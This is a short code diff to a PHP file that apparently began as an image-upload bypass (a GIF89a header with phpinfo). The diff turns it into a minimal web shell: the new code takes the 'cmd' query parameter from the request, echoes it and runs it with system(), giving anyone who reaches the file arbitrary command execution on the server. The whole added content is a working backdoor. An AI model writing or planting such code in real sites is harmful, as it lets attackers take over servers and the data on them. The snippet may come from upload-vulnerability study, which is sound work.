@@ -1,4 +1,5 @@
-GIF89a;
 <?php
-    phpinfo();
+    $cmd = $_GET['cmd'];
+    echo $cmd;
+    system($cmd);
 ?>
